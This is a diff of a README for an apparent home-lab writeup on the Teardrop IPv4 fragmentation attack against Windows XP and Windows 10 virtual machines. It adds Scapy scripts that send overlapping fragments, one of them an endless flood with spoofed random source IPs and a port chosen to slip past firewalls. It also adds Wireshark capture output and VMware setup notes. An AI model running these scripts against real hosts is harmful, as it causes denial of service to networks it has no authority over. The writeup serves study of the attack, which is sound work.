@@ -1,11 +1,5 @@
 # IPv4 Fragmentarion Attack (Teardrop ICMP/UDP) Writeup
 
-## Introduction
-This writeup emerges from desire to learn the structure of IPv4 datagram headers and how to manipulate them, rather than simply exploiting the vulnerability itself.
-This folder of repository contains a practical demonstration of the Teardrop attack, which exploits a vulnerability in the IPv4 Fragment reassembly process.
-
-The attack consists of sending fragments of IP packets with malicious offsets, causing data overlap. Vulnerable systems can suffer from memory exhaustion or critical failure (BSOF/Kernel Panic) while attempting to process these fragments.
-
 ## Index
 
 - [Introduction](#introduction)
@@ -15,6 +9,12 @@ The attack consists of sending fragments of IP packets with malicious offsets, c
 - [Result and impact](#result-and-impact)
 - [Conclusion](#conclusion)
 
+## Introduction
+This lab emerges from desire to learn the structure of IPv4 datagram headers and how to manipulate them, rather than simply exploiting the vulnerability itself.
+This folder of repository contains a practical demonstration of the Teardrop attack, which exploits a vulnerability in the IPv4 Fragment reassembly process.
+
+The attack consists of sending fragments of IP packets with malicious offsets, causing data overlap. Vulnerable systems can suffer from memory exhaustion or critical failure (BSOF/Kernel Panic) while attempting to process these fragments.
+
 ## Folder Structure
 
 The repository is organized as follows:
@@ -22,8 +22,6 @@ The repository is organized as follows:
 ```text
 teardrop-ipv4/
 ├─ README.md               
-├─ report/                         # Detailed documentation
-│   └─ Report_Teardrop_IPv4.md
 ├─ images/                         # Evidences of sistem impact
 │   ├─ xp_idle.png
 │   ├─ xp_attack.png
@@ -47,7 +45,13 @@ teardrop-ipv4/
 
 ## How it works
 
-This technique exploits the **Offset** field of the second packet, setting it to a small value, so that is data overlap with the first fragment during reassembly, forcing the kernel to handle conflicting data.
+The attacker's machine executes a malicious script that sends a large number of maliciously fragmented IPv4 + UDP packets.
+
+The victims, in this case, are machines running Windows XP Pro SP1 (VMware via Bridge mode) and Windows 10 Pro.
+
+To generate the malicious packets, a Python script was written using the Scapy library.
+
+This technique exploits the **Frag Offset** field of the second packet, setting it to a small value so that its data overlaps with that of the first fragment during reassembly, forcing the kernel to handle conflicting data.
 
 ### Example of Logic (Scapy)
 
@@ -58,6 +62,164 @@ p1 = IP(dst=target, flags=1)/UDP(sport=123, dport=80)/("A"*1400)
 p2 = IP(dst=target, frag=1, proto=17)/("B"*1400)
 ```
 
+## Execution & Analysis 
+
+Script v1: validation of overlap of two 1400 byte packets. 
+On the 2nd packet frag=1 (offset of 1 x 8 bytes) is defined, so sistem need to deal with overlap of 1400 bytes.
+	
+```python
+            from scapy.all import *
+                                                                                        
+            p1 = IP(dst="<Target_IP>")/UDP(sport=123, dport=80)/("A"*1400)                              
+            p2 = IP(dst="<Target_IP>")/("B"*1400)                              
+
+            p1.flags = 1 # More Fragments, also possible to define as flags = "MF"                                                                       
+            p2.frag = 1   #Adjust the offset to a position that causes overlap      
+            p2.proto = 17 #According to IANA, we indicate the protocol to use                   
+                                                                                        
+            send(p1, iface="en0")         
+            send(p2, iface="en0")    
+```                                             
+	Traffic Evidence Captured in Wireshark (Script v1 - Target: windows XP Pro)
+	
+		Frame: 1
+		Interface: en0
+		Protocol Stack: Ethernet II -> IPv4 -> UDP -> Data
+		IPv4 
+		├─ Version: 4 
+		├─ Header Length: 20 bytes 
+		├─ Total Length: 1428 bytes 
+		├─ Identification: 0x0001 (1)
+		├─ Flags: 0x1 (More Fragments) 
+		├─ Fragment Offset: 0 
+		├─ TTL: 100
+		├─ Protocol: UDP (17) 
+		├─ Source IP: <Attacker_IP> 
+		└─ Destination IP: <Target_IP>
+		Data (Payload) 
+		├─ Length: 1408 bytes 
+		└─ Content: 007b0050...  <- Contains the spoofed UDP header and payload with "A"
+	
+		Frame: 2
+		Interface: en0
+		Protocol Stack: Ethernet II -> IPv4 -> UDP (Fragmented)
+		IPv4 
+		├─ Version: 4 
+		├─ Header Length: 20 bytes 
+		├─ Total Length: 1420 bytes 
+		├─ Identification: 0x0001 (1) 
+		├─ Flags: 0x0 (Last Fragment)
+		├─ Fragment Offset: 1     <- Start at byte 8
+		├─ TTL: 100
+		├─ Protocol: UDP (17) 
+		├─ Source IP: <Attacker_IP> 
+		└─ Destination IP: <Target_IP>
+		Analysis 
+		├─ Reassembly: [2 IPv4 Fragments (1408 bytes): nº 1, nº 2] 
+		├─ Overlap: This frame overlaps 1400 bytes from the previous frame. 
+		├─ Ambiguity: Wireshark interprets the start of this payload as NTP (Network Time Protocol) due to the spoofed UDP ports. 
+		└─ Status: Identified as [Reassembled IPv4], indicating that the TCP/IP stack has accepted the peering.
+		
+	Script v2: automating bulk sending with IP Spoofing (RandIP) to test for resource exaustion when system mantains multiple "incompleted packets" states in memory.
+	
+```python
+			from scapy.all import *
+			import time
+			import random
+			
+			target = "<TARGET_IP>"
+			interface = "en0"
+			
+			try:
+			    while True:
+			        random_ip = str(RandIP())
+			                
+			        p1 = IP(src=random_ip, dst=target, flags=1, id=66)/UDP(sport=123, dport=80)/("A"*1400)
+			        p2 = IP(src=random_ip, dst=target, frag=1, id=66, proto=17)/("B"*1400)
+			        
+				   send([p1, p2], iface=interface, verbose=False)
+			            
+			except KeyboardInterrupt:
+			    print("\nAttack interrupted.")	
+```
+	Traffic Evidence (Script v2 - Target: windows XP Pro)
+	
+		Frame: 13006545
+		Interface: en0
+		Protocol Stack: Ethernet II → IPv4 → Data (Fragmento 1) 
+		IPv4 
+		├─ Version: 4 
+		├─ Header Length: 20 bytes 
+		├─ Total Length: 1428 bytes 
+		├─ Identification: 0x0042 (66) 
+		├─ Flags: 0x1 (More Fragments) 
+		├─ Fragment Offset: 0          
+		├─ TTL: 64 
+		├─ Protocol: UDP (17) 
+		├─ Source IP: 149.215.95.68 
+		└─ Destination IP: 192.168.8.133 
+		Data (Payload) 
+		├─ Length: 1408 bytes 
+		└─ Content: 007b00500580c76b4141...     <-   contains spoofed UDP header (Ports 123 -> 80) and beggining of payload "A".
+
+		Frame: 13006546
+		Interface: en0
+		Protocol Stack: Ethernet II -> IPv4 -> UDP (Reassembled) -> NTP 
+		IPv4 
+		├─ Version: 4 
+		├─ Header Length: 20 bytes
+		├─ Total Length: 1420 bytes 
+		├─ Identification: 0x0042 (66) 
+		├─ Flags: 0x0 (Last Fragment) 
+		├─ Fragment Offset: 1       <- It starts at byte 8 (1 x 8 bytes) and results in a 1400-byte overlap of the first fragment.
+		├─ TTL: 64 
+		├─ Protocol: UDP (17) 
+		├─ Source IP: 149.215.95.68 
+		└─ Destination IP: 192.168.8.133 
+		Analysis 
+		├─ Reassembly: [2 IPv4 Fragments (1408 bytes): nº 13006545, nº 13006546]
+		├─ Status: Identified as [Reassembled IPv4], indicating that the TCP/IP stack has accepted the peering.
+		└─ Ambiguity: Wireshark interprets the final payload as NTP because the spoofed source port of the first fragment is 123.
+	
+	
+	Traffic Evidence (Script v2 - Target: Windows 10 Pro)
+		 
+		Frame: 21590
+		Interface: \Device\NPF_{...}
+		Protocol Stack: Ethernet II -> IPv4 -> Data (Fragment 1) 
+		IPv4 
+		├─ Version: 4 
+		├─ Header Length: 20 bytes 
+		├─ Total Length: 1428 bytes 
+		├─ Identification: 0x0042 (66) 
+		├─ Flags: 0x1 (More Fragments) 
+		├─ Fragment Offset: 0
+		├─ TTL: 64 ├─ Protocol: UDP (17) 
+		├─ Source IP: 239.79.93.157 
+		└─ Destination IP: 192.168.8.142 
+		Data (Payload) 
+		├─ Length: 1408 bytes 
+		└─ Content: 007b005005806f914141... 
+		
+		Frame: 21591
+		Interface: \Device\NPF_{...}
+		Protocol Stack: Ethernet II -> IPv4 -> UDP (Reassembled) -> NTP IPv4 
+		├─ Version: 4 
+		├─ Header Length: 20 bytes 
+		├─ Total Length: 1420 bytes 
+		├─ Identification: 0x0042 (66) 
+		├─ Flags: 0x0 (Last Fragment) 
+		├─ Fragment Offset: 1   
+		├─ TTL: 64 
+		├─ Protocol: UDP (17) 
+		├─ Source IP: 239.79.93.157 
+		└─ Destination IP: 192.168.8.142 
+		Analysis 
+		├─ Reassembly: [2 IPv4 Fragments (1408 bytes): nº 13006545, nº 13006546]
+		├─ Status: Identified as [Reassembled IPv4], indicating that the TCP/IP stack has accepted the peering.
+		└─ Ambiguity: Wireshark interprets the final payload as NTP because the spoofed source port of the first fragment is 123.
+	
+	
 ## Result and impact
 
 During Wireshark analysis, the acceptance of overlapping fragments (`Reassembled IPv4`) was confirmed. The use of **port 123 (NTP)** was applied to bypass firewalls.
@@ -71,6 +233,17 @@ During Wireshark analysis, the acceptance of overlapping fragments (`Reassembled
 
 ## Conclusion
 
-Both machines where imune to IPv4 Fragmentation Attack immediate crach due non-paged pool memory leak, although Windows 10 Pro has demonstrated vulnerability to resource exhaustion, resulting in slowness and difficulty in restoring memory even after the attack ends. 
+Both machines where imune to IPv4 Fragmentation Attack immediate crach due non-paged pool memory leak, although Windows 10 Pro has demonstrated vulnerability to resource exhaustion, resulting in slowness and difficulty in restoring memory even after the attack ends.
 
-**Note:** To obtain the complete technical report with evidence and analysis, access the directory [`/report`](https://www.google.com/search?q=./report/Report_Teardrop_IPv4.md).
+## Troubleshooting
+The VM where configured to use Bridge mode, to interact with network directly, but the VM was not able to obtain connection with LAN. So I needed to reconfigure VMnet0 on Virtual Network Editor and reinstall VMware Bridge Protocol of network card.
+
+### Instructions
+
+VMnet0 Reconfiguration: VMware -> Edit -> Virtual Network Editor.
+VMware Bridge Protocol reinstalation: Control Panel -> Network and Internet -> Network Connections -> click no rato com botao direito-> Properties.
+
+manual service initialization:
+```bash
+    net start vmnetbridge
+```
